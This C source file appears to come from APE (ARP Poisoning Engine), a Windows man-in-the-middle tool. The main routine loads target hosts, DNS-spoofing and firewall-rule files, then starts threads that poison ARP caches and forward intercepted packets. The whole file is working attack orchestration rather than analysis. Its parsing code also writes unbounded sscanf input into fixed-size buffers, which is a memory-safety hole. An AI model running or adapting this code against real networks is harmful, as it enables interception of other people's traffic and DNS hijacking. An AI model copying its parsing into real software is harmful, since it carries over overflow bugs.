#include <Windows.h>
#include <stdio.h>
#include <Shlwapi.h>
#include "APE.h"
#include "ArpPoisoning.h"
#include "DnsPoisoning.h"
#include "LinkedListSystems.h"
#include "LinkedListFirewallRules.h"
#include "PacketProxy.h"


extern int gDEBUGLEVEL;
extern RULENODE gFWRulesList;
extern PSYSNODE gSystemsList;
extern SCANPARAMS gScanParams;

extern DWORD gRESENDThreadID;
extern DWORD gPOISONINGThreadID;

extern HANDLE gRESENDThreadHandle;
extern HANDLE gPOISONINGThreadHandle;

/*
 * All-in-one solution, target range
 *
 * param   Ifc-Name
 *   -x     {...}
 *
 * 1. Parse input list
 * 2. Parse firewall rules
 * 3. ForwardPackets thread
 * 4. StartARPPoisoning thread
 *
 */

void InitializeMITM()
{
  char srcIsStr[MAX_IP_LEN] = { 0 };
  unsigned short srcPortLower = 0;
  unsigned short srcPortUpper = 0;
  char dstIPStr[MAX_IP_LEN] = { 0 };
  unsigned short dstPortLower = 0;
  unsigned short dstPortUpper = 0;

  unsigned char ipStr[MAX_IP_LEN];
  unsigned char macStr[MAX_MAC_LEN];
  unsigned char ipBin[BIN_IP_LEN];
  unsigned char macBin[BIN_MAC_LEN];
  char tempLine[MAX_BUF_SIZE + 1];
  char tempBuffer[MAX_BUF_SIZE + 1] = { 0 };
  FILE *fileHandle = NULL;
  char protocol[12] = { 0 };
  int funcRetVal = 0;
  PRULENODE tempNode = NULL;

  AdminCheck(gScanParams.applicationName);
  RemoveMacFromCache((char *)gScanParams.interfaceName, "*");
  Sleep(500);
  RemoveMacFromCache((char *)gScanParams.interfaceName, "*");
  LogMsg(2, "main(): -x %s\n", gScanParams.interfaceName);


  /*
   * Initialisation. Parse parameters (Ifc, start IP, stop IP) and
   * pack them in the scan configuration struct.
   */
  MacBin2String(gScanParams.localMacBin, gScanParams.localMacStr, MAX_MAC_LEN);
  IpBin2String(gScanParams.localIpBin, gScanParams.localIpStr, MAX_IP_LEN);

  MacBin2String(gScanParams.gatewayMacBin, gScanParams.gatewayMacStr, MAX_MAC_LEN);
  IpBin2String(gScanParams.gatewayIpBin, gScanParams.gatewayIpStr, MAX_IP_LEN);

  // Set exit function to trigger depoisoning functions and command.
  SetConsoleCtrlHandler((PHANDLER_ROUTINE)APE_ControlHandler, TRUE);

  // Set GW IP static.
  SetMacStatic((char *)gScanParams.interfaceAlias, (char *)gScanParams.gatewayIpStr, (char *)gScanParams.gatewayMacStr);

  if (gDEBUGLEVEL > DBG_INFO)
  {
    PrintConfig(gScanParams);
  }

  // 0 Add default GW to the gSystemsList
  AddToSystemsList(&gSystemsList, gScanParams.gatewayMacBin, (char *)gScanParams.gatewayIpStr, gScanParams.gatewayIpBin);


  // 1. Parse target file
  if (!PathFileExists(FILE_HOST_TARGETS))
  {
    printf("No target hosts file \"%s\"!\n", FILE_HOST_TARGETS);
    goto END;
  }

  // MARKER : for unknown reasons I cant run this code inside a function -> crash!?!
  //    ParseTargetHostsConfigFile(FILE_HOST_TARGETS);
  if (FILE_HOST_TARGETS != NULL && (fileHandle = fopen(FILE_HOST_TARGETS, "r")) != NULL)
  {
    ZeroMemory(tempLine, sizeof(tempLine));
    ZeroMemory(ipStr, sizeof(ipStr));
    ZeroMemory(macStr, sizeof(macStr));
    ZeroMemory(ipBin, sizeof(ipBin));
    ZeroMemory(macBin, sizeof(macBin));

    while (fgets(tempLine, sizeof(tempLine), fileHandle) != NULL)
    {
      // Ignore trailing CR/LF
      while (tempLine[strlen(tempLine) - 1] == '\r' || tempLine[strlen(tempLine) - 1] == '\n')
      {
        tempLine[strlen(tempLine) - 1] = '\0';
      }

      // parse values and add them to the list.
      if (sscanf(tempLine, "%[^,],%s", ipStr, macStr) == 2)
      {
        MacString2Bin(macBin, macStr, strnlen((char *)macStr, sizeof(macStr) - 1));
        IpString2Bin(ipBin, ipStr, strnlen((char *)ipStr, sizeof(ipStr) - 1));

        AddToSystemsList(&gSystemsList, macBin, (char *)ipStr, ipBin);
        LogMsg(DBG_MEDIUM, "ParseTargetHostsConfigFile(): New system added :  %s/%s", macStr, ipStr);

        SetMacStatic((char *)gScanParams.interfaceAlias, (char *)ipStr, (char *)macStr);
      }

      ZeroMemory(tempLine, sizeof(tempLine));
      ZeroMemory(ipStr, sizeof(ipStr));
      ZeroMemory(macStr, sizeof(macStr));
      ZeroMemory(ipBin, sizeof(ipBin));
      ZeroMemory(macBin, sizeof(macBin));
    }

    fclose(fileHandle);
  }

  WriteDepoisoningFile();

  // 2. Parse DNS Poisoning and Firewall files
  if (PathFileExists(FILE_DNS_POISONING))
  {
    ParseDnsPoisoningConfigFile(FILE_DNS_POISONING);
    DetermineSpoofingResponseData(&gScanParams);
  }

  if ((fileHandle = fopen(FILE_FIREWALL_RULES1, "r")) != NULL || (fileHandle = fopen(FILE_FIREWALL_RULES2, "r")) != NULL)
  {
    printf("main(): Parsing firewall rules file \"%s\"\n", FILE_FIREWALL_RULES1);
    while (!feof(fileHandle))
    {
      fgets(tempBuffer, sizeof(tempBuffer), fileHandle);
      ZeroMemory(srcIsStr, sizeof(srcIsStr));
      ZeroMemory(dstIPStr, sizeof(dstIPStr));

      // Remove all trailing NL/LF 
      while (tempBuffer[strnlen(tempBuffer, sizeof(tempBuffer)) - 1] == '\r' || tempBuffer[strnlen(tempBuffer, sizeof(tempBuffer)) - 1] == '\n')
      {
        tempBuffer[strnlen(tempBuffer, sizeof(tempBuffer)) - 1] = 0;
      }

      if ((funcRetVal = sscanf(tempBuffer, "%[^:]:%[^:]:%hu:%hu:%[^:]:%hu:%hu", protocol, srcIsStr, &srcPortLower, &srcPortUpper, dstIPStr, &dstPortLower, &dstPortUpper)) != 7 ||
        tempBuffer[0] == '#')
      {
        continue;
      }

      if ((tempNode = (PRULENODE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RULENODE))) != NULL)
      {
        ZeroMemory(tempNode, sizeof(RULENODE));

        tempNode->DstIPBin = inet_addr(dstIPStr);
        strncpy(tempNode->DstIPStr, dstIPStr, sizeof(tempNode->DstIPStr) - 1);
        tempNode->DstPortLower = dstPortLower;
        tempNode->DstPortUpper = dstPortUpper;

        tempNode->SrcIPBin = inet_addr(srcIsStr);
        strncpy(tempNode->SrcIPStr, srcIsStr, sizeof(tempNode->SrcIPStr) - 1);
        tempNode->SrcPortLower = srcPortLower;
        tempNode->SrcPortUpper = srcPortUpper;

        strncpy(tempNode->Protocol, protocol, sizeof(tempNode->Protocol) - 1);
        snprintf(tempNode->Descr, sizeof(tempNode->Descr) - 1, "%s %s:(%d-%d) -> %s:(%d-%d)", tempNode->Protocol, tempNode->SrcIPStr, tempNode->SrcPortLower, tempNode->SrcPortUpper, tempNode->DstIPStr, tempNode->DstPortLower, tempNode->DstPortUpper);

        AddRuleToList(&gFWRulesList, tempNode);
      }
    }

    fclose(fileHandle);
  }

  // 1. Start Ethernet FORWARDING thread
  if ((gRESENDThreadHandle = CreateThread(NULL, 0, ForwardPackets, &gScanParams, 0, &gRESENDThreadID)) == NULL)
  {
    LogMsg(DBG_ERROR, "main(): Can't start Listener thread : %d", GetLastError());
    goto END;
  }

  // 2. Start POISONING the ARP caches.
  if ((gPOISONINGThreadHandle = CreateThread(NULL, 0, StartArpPoisoning, &gScanParams, 0, &gPOISONINGThreadID)) == NULL)
  {
    LogMsg(DBG_ERROR, "main(): Can't start NetworkScanner thread : %d", GetLastError());
    goto END;
  }

  Sleep(500);
  while (gPOISONINGThreadHandle != INVALID_HANDLE_VALUE && gRESENDThreadHandle != INVALID_HANDLE_VALUE)
  {
    if (WaitForSingleObject(gPOISONINGThreadHandle, 30) != WAIT_TIMEOUT)
    {
      break;
    }

    if (WaitForSingleObject(gRESENDThreadHandle, 30) != WAIT_TIMEOUT)
    {
      break;
    }

    Sleep(50);
  }

  // MARKER : CORRECT THREAD SHUTDOWN!!
  printf("OOPS!! MAKE SURE THE THREAD GETS SHUT DOWN CORRECTLY!!\n");

END:

  return;
}




void AdminCheck(char *programNameParam)
{
  // The user needs adminstrator privileges to 
  // run APE successfully.
  if (!UserIsAdmin())
  {
    system("cls");
    printf("\nAPE (ARP Poisoning Engine)  Version %s\n", APE_VERSION);
    printf("---------------------------------------\n\n");
    printf("Web\t https://github.com/rubenunteregger\n\n\n");
    printf("You need Administrator permissions to run %s successfully!\n\n", programNameParam);

    exit(1);
  }
}




int UserIsAdmin()
{
  BOOL retVal = FALSE;
  SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
  PSID admGroup = NULL;


  if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admGroup))
  {
    if (!CheckTokenMembership(NULL, admGroup, &retVal))
      retVal = FALSE;
    FreeSid(admGroup);
  }

  return retVal;
}



void ParseTargetHostsConfigFile(char *targetsFileParam)
{
  unsigned char ipStr[MAX_IP_LEN];
  unsigned char macStr[MAX_MAC_LEN];
  unsigned char ipBin[BIN_IP_LEN];
  unsigned char macBin[BIN_MAC_LEN];
  FILE *fileHandle = NULL;
  char tempLine[MAX_BUF_SIZE + 1];


  if (targetsFileParam != NULL && (fileHandle = fopen(targetsFileParam, "r")) != NULL)
  {
    ZeroMemory(tempLine, sizeof(tempLine));
    ZeroMemory(ipStr, sizeof(ipStr));
    ZeroMemory(macStr, sizeof(macStr));
    ZeroMemory(ipBin, sizeof(ipBin));
    ZeroMemory(macBin, sizeof(macBin));

    while (fgets(tempLine, sizeof(tempLine), fileHandle) != NULL)
    {
      while (tempLine[strlen(tempLine) - 1] == '\r' || tempLine[strlen(tempLine) - 1] == '\n')
      {
        tempLine[strlen(tempLine) - 1] = '\0';
      }

      // parse values and add them to the list.
      if (sscanf(tempLine, "%[^,],%s", ipStr, macStr) == 2)
      {
        MacString2Bin(macBin, macStr, strnlen((char *)macStr, sizeof(macStr) - 1));
        IpString2Bin(ipBin, ipStr, strnlen((char *)ipStr, sizeof(ipStr) - 1));

        AddToSystemsList(&gSystemsList, macBin, (char *)ipStr, ipBin);
        LogMsg(DBG_MEDIUM, "ParseTargetHostsConfigFile(): New system added :  %s/%s", macStr, ipStr);
      }

      ZeroMemory(tempLine, sizeof(tempLine));
      ZeroMemory(ipStr, sizeof(ipStr));
      ZeroMemory(macStr, sizeof(macStr));
      ZeroMemory(ipBin, sizeof(ipBin));
      ZeroMemory(macBin, sizeof(macBin));
    }

    fclose(fileHandle);
  }

  return;
}